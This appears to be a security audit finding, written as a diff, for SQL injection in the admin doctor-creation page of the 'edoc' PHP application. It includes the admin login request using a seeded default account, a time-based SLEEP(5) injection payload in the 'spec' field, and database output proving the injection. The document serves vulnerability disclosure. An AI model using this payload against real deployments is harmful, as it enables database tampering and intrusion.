@@ -1,0 +1,26 @@
+EDOC-02: SQLi in admin doctor-creation - $spec concatenated WITHOUT quotes
+Sink: admin/add-new.php:61  $sql1="insert into doctor(docemail,docname,docpassword,docnic,
+      doctel,specialties) values('$email','$name','$password','$nic','$tele',$spec);"
+      ($spec raw, unquoted -> trivial injection); sink 3: $sql2 webuser INSERT; sink 1:
+      L54 duplicate-check SELECT interpolates $email.
+Prereq: admin session ($_SESSION['usertype']=='a') - obtained via the seeded account:
+    POST /login.php useremail=admin%40edoc.com&userpassword=<REDACTED>
+      -> HTTP 302 Location: admin/index.php (seed: admin@edoc.com / <REDACTED>, 3-char numeric default vendor password from SQL_Database_edoc.sql)
+
+    baseline: POST /admin/add-new.php name=DocBase&nic=111&spec=1&email=docbase@test.local
+              &Tele=555&password=pw1&cpassword=pw1   (with admin cookie)
+              -> HTTP 302 in 0.034s
+              DB: doctor row docbase@test.local with specialties=1
+    payload:  POST /admin/add-new.php name=DocInj&nic=222&spec=%28SELECT%20SLEEP%285%29%29
+              &email=docinj@test.local&Tele=556&password=pw2&cpassword=pw2
+              (decodes to spec = (SELECT SLEEP(5)) - injected unquoted into values(...))
+              -> HTTP 302 in 5.051s
+    DB proof: SELECT docemail,specialties FROM doctor WHERE docemail IN ('docbase@test.local','docinj@test.local')
+              -> docbase@test.local | 1
+                 docinj@test.local  | 0   <- SLEEP(5) return value stored in specialties
+              webuser rows created for both (sink 3 executes after sink 2 unconditionally).
+
+[Environment note] Verified under PHP built-in server with a cwd-fixing router
+(php -S resolves the app's include("../connection.php") against the docroot cwd instead
+of the script directory; the router chdir+include emulates Apache). Purely local harness
+detail - does not affect the vulnerability or the payload.
